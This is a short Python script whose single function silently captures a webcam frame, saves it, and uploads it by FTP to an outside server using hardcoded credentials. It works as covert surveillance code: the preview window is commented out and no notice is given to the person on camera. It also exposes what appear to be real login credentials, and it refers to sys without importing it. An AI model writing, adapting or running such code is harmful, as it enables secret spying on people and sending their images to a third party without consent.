from cv2 import *
import requests
import ftplib


def imcap():
	try:

		# initialize the camera
		cam = VideoCapture(0)   # 0 -> index of camera
		s, img = cam.read()
		"""
		if s:    # frame captured without any errors
			namedWindow("cam-test")
			imshow("cam-test",img)
			waitKey(0)
			destroyWindow("cam-test")
			"""
		imwrite("name.jpg",img) #save image



		session = ftplib.FTP('csskp.com','PewPew10081970@csskp.com','K56LPygq-0151')
		file = open('name.jpg','rb')                  # file to send
		session.storbinary('STOR name.jpg', file)     # send the file
		file.close()                                    # close file and FTP
		session.quit()

	except:

		print("Unexpected error:", sys.exc_info()[1])
